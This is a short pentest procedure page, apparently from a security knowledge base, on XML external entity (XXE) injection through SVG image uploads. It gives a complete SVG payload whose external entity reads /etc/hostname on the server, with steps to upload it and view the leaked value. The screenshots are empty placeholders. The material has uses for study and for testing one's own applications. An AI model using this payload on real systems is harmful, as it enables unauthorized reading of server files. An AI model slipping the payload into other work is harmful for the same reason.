---
id: e5ae47ee-4666-4133-9007-59cd4e556e47
name: XXE Using Image File Upload
type: procedure
verified: true
submitted: true
created_at: '2020-08-22T18:58:19.234164+00:00'
updated_at: '2023-05-26T01:34:22.011255+00:00'
platforms:
- Web
tags:
- '[[owasp]]'
- '[[owasp top 10]]'
- '[[Web Applications]]'
- '[[xxe]]'
---

# XXE Using Image File Upload

**Status**: ✓ Verified

## Summary

An SVG image file is created with the XXE payload and uploaded in the application using file upload functionality. Application will process the payload and responds with the requested details. 

## Description

# Description

An SVG image file is created with the XXE payload and uploaded in the application using file upload functionality. Application will process the payload and responds with the requested details.



# Procedure



1. Create an SVG image with the following content and name it as payload.svg



*`<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg*>`





`2. Upload the payload.svg file in the application using file upload functionality as shown in the below screenshot`





![9df1b2b3-8d4e-466f-a8b0-ced7a6491c2c.png]()



3. Post the comment to see the hostname of the server







![d2f5d956-f7db-4010-ac82-633cb3a9bfdb.png]()







## Platforms

- Web

## Tags

- [[owasp]]
- [[owasp top 10]]
- [[Web Applications]]
- [[xxe]]


